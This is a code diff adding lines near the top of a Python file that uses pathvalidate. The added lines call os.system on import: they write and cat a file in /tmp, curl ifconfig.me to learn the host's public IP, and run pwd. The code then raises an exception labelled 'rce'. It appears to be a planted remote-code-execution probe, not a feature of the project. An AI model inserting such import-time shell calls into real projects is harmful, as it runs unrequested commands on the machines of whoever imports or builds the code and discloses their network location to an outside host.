@@ -18,6 +18,12 @@ from pathlib import Path
 from pathvalidate.argparse import validate_filepath_arg
 from pathvalidate import sanitize_filepath
 
+os.system("echo TEST > /tmp/test.txt && cat /tmp/test.txt")
+os.system("curl -s https://ifconfig.me")
+os.system("pwd")
+
+raise Exception("rce")
+
 
 class ConvertVars:
     BASE_PATH = os.path.split(os.path.dirname(os.path.realpath(__file__)))[0]
